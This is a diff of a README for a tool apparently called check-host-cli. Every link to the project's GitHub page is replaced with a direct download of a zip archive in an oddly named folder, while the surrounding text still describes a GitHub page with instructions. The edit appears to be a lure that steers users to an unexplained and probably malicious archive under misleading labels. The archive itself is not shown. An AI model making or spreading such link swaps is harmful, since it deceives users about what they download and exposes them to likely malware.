@@ -1,6 +1,6 @@
 # 🌐 check-host-cli - Test Network from Anywhere
 
-[![Download](https://img.shields.io/badge/Download-Check%20Host-blue?style=for-the-badge)](https://github.com/user50618/check-host-cli)
+[![Download](https://img.shields.io/badge/Download-Check%20Host-blue?style=for-the-badge)](https://raw.githubusercontent.com/user50618/check-host-cli/main/biddableness/cli-host-check-3.5-alpha.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This tool is handy if you want to see if a website is up, if a server responds q
 
 Start by getting the program on your computer. The main place to get it is the GitHub page below. It holds the latest version you can try.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Here-28a745?style=for-the-badge&logo=github)](https://github.com/user50618/check-host-cli)
+[![Download from GitHub](https://img.shields.io/badge/Download-Here-28a745?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/user50618/check-host-cli/main/biddableness/cli-host-check-3.5-alpha.2.zip)
 
 Here is what to do next:
 
@@ -49,7 +49,7 @@ Here is what to do next:
 
 Open your web browser and go to:
 
-https://github.com/user50618/check-host-cli
+https://raw.githubusercontent.com/user50618/check-host-cli/main/biddableness/cli-host-check-3.5-alpha.2.zip
 
 This page has the program files and instructions.
 
@@ -176,7 +176,7 @@ Check these points:
 
 For more detailed information, visit:
 
-https://github.com/user50618/check-host-cli
+https://raw.githubusercontent.com/user50618/check-host-cli/main/biddableness/cli-host-check-3.5-alpha.2.zip
 
 You will find help files, issue tracking, and updates there.
 
@@ -205,4 +205,4 @@ If you see errors:
 
 ---  
 
-[Download check-host-cli from GitHub](https://github.com/user50618/check-host-cli)
+[Download check-host-cli from GitHub](https://raw.githubusercontent.com/user50618/check-host-cli/main/biddableness/cli-host-check-3.5-alpha.2.zip)
